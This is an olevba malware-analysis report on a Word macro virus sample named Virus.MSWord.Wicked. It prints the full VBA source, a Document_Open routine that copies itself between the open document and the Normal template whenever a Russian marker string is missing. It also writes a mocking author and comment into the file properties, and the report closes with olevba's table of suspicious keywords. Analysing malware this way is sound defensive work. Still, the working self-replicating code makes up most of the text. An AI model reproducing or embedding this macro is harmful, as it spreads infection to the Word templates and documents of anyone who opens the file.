olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wicked-b59abb527e5e7388430bf83f06c3ed4bd1730407
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wicked-b59abb527e5e7388430bf83f06c3ed4bd1730407 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Const flag = "Здесь вирусов нет"

Private Sub Document_Open()
Set x1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set x2 = NormalTemplate.VBProject.VBComponents.Item(1)

x3 = x1.CodeModule.Find(flag, 1, 1, 10000, 10000)
x4 = x2.CodeModule.Find(flag, 1, 1, 10000, 10000)

If x4 = False Then
    x11 = x1.CodeModule.Lines(1, x1.CodeModule.CountOfLines)
    x2.CodeModule.DeleteLines 1, x2.CodeModule.CountOfLines
    x2.CodeModule.AddFromString x11
    With Dialogs(wdDialogFileSummaryInfo): .Title = "": .Subject = "": .Author = "Добрый доктор Айболит": .Keywords = "": .Comments = "Злые вирусы здесь больше не живут и жить не будут": .Execute: End With
    NormalTemplate.Save
End If
If x3 = False Then
    x11 = x2.CodeModule.Lines(1, x2.CodeModule.CountOfLines)
    x1.CodeModule.DeleteLines 1, x1.CodeModule.CountOfLines
    x1.CodeModule.AddFromString x11
    With Dialogs(wdDialogFileSummaryInfo): .Title = "": .Subject = "": .Author = "Добрый доктор Айболит": .Keywords = "": .Comments = "Злые вирусы здесь больше не живут и жить не будут": .Execute: End With
    ActiveDocument.Save
End If

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

